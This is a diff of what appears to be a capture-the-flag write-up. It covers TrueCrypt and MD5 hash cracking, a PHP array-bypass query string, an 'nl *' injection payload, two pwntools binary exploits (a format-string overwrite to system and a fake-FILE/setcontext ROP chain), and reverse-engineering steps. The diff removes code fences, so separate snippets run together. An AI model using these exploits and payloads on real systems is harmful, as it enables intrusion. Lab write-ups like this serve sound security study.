@@ -37,11 +37,6 @@ image-20251028225320940
 
 ```
 python truecrypt2john.py ../../SecDisk > secdisk.hash
-```
-
-
-
-```
 import uuid
 import hashlib
 
@@ -96,11 +91,6 @@ c9f0f895fb98ab9159f51fd0297e236d
 cfcd208495d565ef66e7dff9f98764da
 cbb184dd8e05c9709e5dcaedaa0495cf
 '''
-```
-
-
-
-```
 import hashlib
 
 output = '''8fa14cdd754f91cc6554c9e71929cce7
@@ -156,23 +146,8 @@ for x in output:
 # {'7fc56270e7a70fa81a5935b72eacbe29': 'A', '9d5ed678fe57bcca610140957afab571': 'B', '0d61f8370cad1d412f80b84d143e1257': 'C', 'f623e75af30e62bbd73d6df5b50bb7b5': 'D', '3a3ea00cfc35332cedf6e5e9a32e94da': 'E', '800618943025315f869e4e1f09471012': 'F', 'dfcf28d0734569a6a693bc8194de62bf': 'G', 'c1d9f50f86825a1a2302ec2449c17196': 'H', 'dd7536794b63bf90eccfd37f9b147d7f': 'I', 'ff44570aca8241914870afbc310cdb85': 'J', 'a5f3c6a11b03839d46af9fb43c97c188': 'K', 'd20caec3b48a1eef164cb4ca81ba2587': 'L', '69691c7bdcc3ce6d5d8a1361f22d04ac': 'M', '8d9c307cb7f3c4a32822a51922d1ceaa': 'N', 'f186217753c37b9b9f958d906208506e': 'O', '44c29edb103a2872f519ad0c9a0fdaaa': 'P', 'f09564c9ca56850d4cd6b3319e541aee': 'Q', 'e1e1d3d40573127e9ee0480caf1283d6': 'R', '5dbc98dcc983a70728bd082d1a47546e': 'S', 'b9ece18c950afbfa6b0fdbfa4ff731d3': 'T', '4c614360da93c0a041b22e537de151eb': 'U', '5206560a306a2e085a437fd258eb57ce': 'V', '61e9c06ea9a85a5088a499df6458d276': 'W', '02129bb861061d1a052c592e2dc6b383': 'X', '57cec4137b614c87cb4e24a3d003a3e0': 'Y', '21c2e59531c8710156d34a3c30ac81d5': 'Z', '0cc175b9c0f1b6a831c399e269772661': 'a', '92eb5ffee6ae2fec3ad71c777531578f': 'b', '4a8a08f09d37b73795649038408b5f33': 'c', '8277e0910d750195b448797616e091ad': 'd', 'e1671797c52e15f763380b45e841ec32': 'e', '8fa14cdd754f91cc6554c9e71929cce7': 'f', 'b2f5ff47436671b6e533d8dc3614845d': 'g', '2510c39011c5be704182423e3a695e91': 'h', '865c0c0b4ab0e063e5caa3387c1a8741': 'i', '363b122c528f54df4a0446b6bab05515': 'j', '8ce4b16b22b58894aa86c421e8759df3': 'k', '2db95e8e1a9267b7a1188556b2013b33': 'l', '6f8f57715090da2632453988d9a1501b': 'm', '7b8b965ad4bca0e41ab51de7b31363a1': 'n', 'd95679752134a2d9eb61dbd7b91c4bcc': 'o', '83878c91171338902e0fe0fb97a8c47a': 'p', '7694f4a66316e53c8cdd9d9954bd611d': 'q', '4b43b0aee35624cd95b910189b3dc231': 'r', '03c7c0ace395d80182db07ae2c30f034': 's', 'e358efa489f58062f10dd7316b65649e': 't', '7b774effe4a349c6dd82ad4f4f21d34c': 'u', '9e3669d19b675bd57058fd4664205d2a': 'v', 'f1290186a5d0b1ceab27f4e77c0c5d68': 'w', '9dd4e461268c8034f5c8564e155c67a6': 'x', '415290769594460e2e485922904f345d': 'y', 'fbade9e36a3f36d3d676c1b808451dd7': 'z', 'cfcd208495d565ef66e7dff9f98764da': '0', 'c4ca4238a0b923820dcc509a6f75849b': '1', 'c81e728d9d4c2f636f067f89cc14862c': '2', 'eccbc87e4b5ce2fe28308fd9f2a7baf3': '3', 'a87ff679a2f3e71d9181a67b7542122c': '4', 'e4da3b7fbbce2345d7772b0674a318d5': '5', '1679091c5a880faf6fb5e6087eb1b2dc': '6', '8f14e45fceea167a5a36dedd4bea2543': '7', 'c9f0f895fb98ab9159f51fd0297e236d': '8', '45c48cce2e2d7fbdea1afc51c7c6ad26': '9', '336d5ebc5436534e61d16e63ddfca327': '-', 'b14a7b8059d9c055954c92674ce60032': '_', '5058f1af8388633f609cadb75a75dc9d': '.', '4c761f170e016836ff84498202b99827': '~', 'f95b70fdc3088560732a5ac135644506': '{', 'cbb184dd8e05c9709e5dcaedaa0495cf': '}'}
 
 # flag{51e13c0e21172adf1883b515f52afb80}
-```
-
-
-
-```
 ?a[]=123&b[]=456
-```
-
-
-
-```
 nl *
-```
-
-
-
-```
 from pwn import *
 import ctypes
 
@@ -187,16 +162,15 @@ libcc = ctypes.CDLL('./libc.so.6')
 setvbuf = 0x404038
 system = 0x4010B0
 stdin = 0x404070
-payload = fmtstr_payload(8, {setvbuf:system, stdin:0x404100, 0x404100:0x68732f6e69622f, 0x404018:0x4011F5})
+payload = fmtstr_payload(8, {setvbuf:
+system, stdin:
+0x404100, 0x404100:
+0x68732f6e69622f, 0x404018:
+0x4011F5})
 
 p.sendline(payload)
 
 p.interactive()
-```
-
-
-
-```
 from pwn import *
 import ctypes
 
@@ -282,7 +256,8 @@ fake_file += p64(ch_1_addr)  # _IO_write_ptr
 fake_file += p64(ch_1_addr)  # _IO_write_end
 fake_file += p64(0)  # _IO_buf_base;
 fake_file += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)
-fake_file += p64(0) * 4# from _IO_save_base to _markers
+fake_file += p64(0) * 4
+# from _IO_save_base to _markers
 fake_file += p64(0)  # the FILE chain ptr
 fake_file += p32(2)  # _fileno for stderr is 2
 fake_file += p32(0)  # _flags2, usually 0
@@ -295,9 +270,11 @@ fake_file += p64(libc.sym['_IO_2_1_stdout_'] + 0x1ea0)  # _IO_stdfile_1_lock
 fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
 fake_file += p64(0)  # _codecvt, usually 0
 fake_file += p64(file_addr + 0x10)  # _IO_wide_data_1
-fake_file += p64(0) * 3# from _freeres_list to __pad5
+fake_file += p64(0) * 3
+# from _freeres_list to __pad5
 fake_file += p32(0xFFFFFFFF)  # _mode, usually -1
-fake_file += b"x00" * 19# _unused2
+fake_file += b"x00" * 19
+# _unused2
 fake_file = fake_file.ljust(0xD8 - 0x10, b'x00')  # adjust to vtable
 fake_file += p64(libc.address + 0x1d2ae0)  # fake vtable
 fake_file += p64(file_addr + 0xe8)  # next
@@ -322,7 +299,8 @@ frame.rip = libc.sym['open']
 
 frame = bytearray(bytes(frame))
 frame[8:8 + 8] = p64(frame_addr)
-frame[0x20:0x20 + 8] = p64(libc.sym['setcontext'] + 61)
+frame[0x20:
+0x20 + 8] = p64(libc.sym['setcontext'] + 61)
 frame = bytes(frame)
 
 rop = b''
@@ -362,23 +340,8 @@ pause()
 p.sendlineafter(b">>", b"5")
 
 p.interactive()
-```
-
-
-
-```
 python pyinstxtractor.py re1
-```
-
-
-
-```
 pycdc/pycdc src.pyc
-```
-
-
-
-```
 # Source Generated with Decompyle++
 # File: src.pyc (Python 3.10)
 
@@ -413,24 +376,9 @@ def main():
 if __name__ == '__main__':
     main()
     returnNone
-```
-
-
-
-```
 hashcat -a 3 -m 0 b4bb721a74f07177a6dbc3e113c327e3 ?d?d?d?d?d?d?d?d?d
-```
-
-
-
-```
 enc = [0xB4, 0xB6, 0x9F, 0xA1, 0xC5, 0xAD, 0x7A, 0x68, 0x77, 0xAD, 0x7B, 0x70, 0x1D, 0x68, 0x70, 0x7B, 0x76, 0x70, 0xA0, 0x7C, 0x1D, 0xAE, 0x7B, 0x77, 0xB4, 0x7C, 0xAE, 0xB4, 0x68, 0xA0, 0x68, 0xF9, 0x76, 0xB3, 0x70, 0x77, 0x9F, 0xBA]
 key = [3, 5, 1, 6, 2, 4, 5, 6, 3, 1, 2, 5, 4, 6, 1, 3, 2, 5, 4, 6, 1, 3, 2, 5, 4, 6, 1, 3, 5, 2, 4, 6, 1, 3, 2, 5, 4, 6, 1, 3]
-```
-
-
-
-```
 enc = [0xB4, 0xB6, 0x9F, 0xA1, 0xC5, 0xAD, 0x7A, 0x68, 0x77, 0xAD, 0x7B, 0x70, 0x1D, 0x68, 0x70, 0x7B, 0x76, 0x70, 0xA0, 0x7C, 0x1D, 0xAE, 0x7B, 0x77, 0xB4, 0x7C, 0xAE, 0xB4, 0x68, 0xA0, 0x68, 0xF9, 0x76, 0xB3, 0x70, 0x77, 0x9F, 0xBA]
 key = [3, 5, 1, 6, 2, 4, 5, 6, 3, 1, 2, 5, 4, 6, 1, 3, 2, 5, 4, 6, 1, 3, 2, 5, 4, 6, 1, 3, 5, 2, 4, 6, 1, 3, 2, 5, 4, 6, 1, 3]
 
